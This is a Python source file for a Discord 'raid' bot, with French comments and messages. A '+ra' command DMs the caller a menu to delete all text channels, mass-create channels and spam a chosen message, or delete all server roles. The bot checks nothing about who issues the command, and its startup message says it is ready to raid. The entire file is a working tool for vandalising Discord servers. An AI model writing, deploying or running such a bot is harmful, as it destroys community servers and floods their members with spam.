# raidbot.py
import os
import asyncio
from discord.ext import commands
import discord

TOKEN = os.getenv("TOKEN")
PREFIX = os.getenv("PREFIX", "+")
intents = discord.Intents.default()
intents.guilds = True          # gestion des salons / rôles
intents.members = True         # accès aux membres (pour les DM)
intents.message_content = True # besoin pour lire le contenu des messages

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ------------------------------------------------------------------
# 1️⃣ Commande +ra : envoie un embed interactif dans les DM
# ------------------------------------------------------------------
@bot.command(name="ra")
async def raid(ctx: commands.Context):
    if not isinstance(ctx.channel, discord.DMChannel):
        try:
            await ctx.author.send("💬 **Commande reçue !** Voici vos options.")
        except discord.Forbidden:
            await ctx.reply("Je ne peux pas t’envoyer de DM. Active tes DMs privés s’il te plaît.", delete_after=10)
            return

    embed = discord.Embed(
        title="⚔️ RaidBot – Choisis une action",
        description="""
1️⃣ **Supprimer tous les salons** (≥ 100)  
2️⃣ **Créer des salons** et spammer un message  
3️⃣ **Supprimer tous les rôles**
""",
        color=0xFF0000
    )
    embed.set_footer(text="Réponds par 1, 2 ou 3. Tu as 30 secondes.")
    await ctx.author.send(embed=embed)

    def check(m: discord.Message):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel) and m.content.strip() in {"1", "2", "3"}

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.author.send("⏱️ Temps écoulé : action annulée.")
        return

    if msg.content == "1":
        await delete_all_channels(ctx.guild, ctx.author)
    elif msg.content == "2":
        await create_and_spam(ctx.guild, ctx.author)
    else:
        await delete_all_roles(ctx.guild, ctx.author)

# ------------------------------------------------------------------
# 2️⃣ Fonction : Supprimer tous les salons (≥ 100)
# ------------------------------------------------------------------
async def delete_all_channels(guild: discord.Guild, user: discord.User):
    to_delete = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
    if len(to_delete) < 100:
        await user.send(f"⚠️ Seulement {len(to_delete)} salons. Action refusée (≥ 100 requis).")
        return

    sent = await user.send("🚨 Suppression des salons en cours…")
    for ch in to_delete:
        try:
            await ch.delete(reason=f"RaidBot – supprimé par {user}")
        except Exception as e:
            print(f"[ERREUR] Impossible de supprimer {ch.name}: {e}")

    await sent.edit(content="✅ Tous les salons ont été supprimés.")

# ------------------------------------------------------------------
# 3️⃣ Fonction : Créer des salons + spam
# ------------------------------------------------------------------
async def create_and_spam(guild: discord.Guild, user: discord.User):
    # Demander le nombre de salons
    await user.send("Combien de salons voulez‑vous créer ? (1‑50)")
    try:
        msg = await bot.wait_for("message", timeout=30.0,
                                 check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel))
        nb_salon = int(msg.content.strip())
    except (asyncio.TimeoutError, ValueError):
        await user.send("⏱️ Temps écoulé ou nombre invalide. Annulation.")
        return

    if not 1 <= nb_salon <= 50:
        await user.send("❌ Le nombre doit être entre 1 et 50.")
        return

    # Demander le nom de base
    await user.send("Nom de base pour les salons (ex : \"raid-\" → raid‑1, raid‑2…)")
    try:
        msg = await bot.wait_for("message", timeout=30.0,
                                 check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel))
        base_name = msg.content.strip()
    except asyncio.TimeoutError:
        await user.send("⏱️ Temps écoulé. Annulation.")
        return

    # Demander le message spam
    await user.send("Message à envoyer dans chaque salon (max 2000 caractères)")
    try:
        msg = await bot.wait_for("message", timeout=60.0,
                                 check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel))
        spam_msg = msg.content.strip()
    except asyncio.TimeoutError:
        await user.send("⏱️ Temps écoulé. Annulation.")
        return

    sent = await user.send(f"🛠️ Création de {nb_salon} salons en cours…")
    for i in range(1, nb_salon + 1):
        ch_name = f"{base_name}{i}"
        try:
            channel = await guild.create_text_channel(ch_name,
                                                      reason=f"RaidBot – créé par {user}")
            await channel.send(spam_msg)
        except Exception as e:
            print(f"[ERREUR] Impossible de créer {ch_name}: {e}")

    await sent.edit(content="✅ Salons créés et messages envoyés.")

# ------------------------------------------------------------------
# 4️⃣ Fonction : Supprimer tous les rôles
# ------------------------------------------------------------------
async def delete_all_roles(guild: discord.Guild, user: discord.User):
    # On ne supprime pas le rôle @everyone (id == guild.id)
    roles = [r for r in guild.roles if r.id != guild.id]
    sent = await user.send("⚠️ Suppression des rôles en cours…")
    for role in roles:
        try:
            await role.delete(reason=f"RaidBot – supprimé par {user}")
        except Exception as e:
            print(f"[ERREUR] Impossible de supprimer le rôle {role.name}: {e}")

    await sent.edit(content="✅ Tous les rôles ont été supprimés.")

# ------------------------------------------------------------------
# 5️⃣ Lancement du bot
# ------------------------------------------------------------------
@bot.event
async def on_ready():
    print(f"🚀 {bot.user} connecté. Prêt à raid !")

if __name__ == "__main__":
    bot.run(TOKEN)
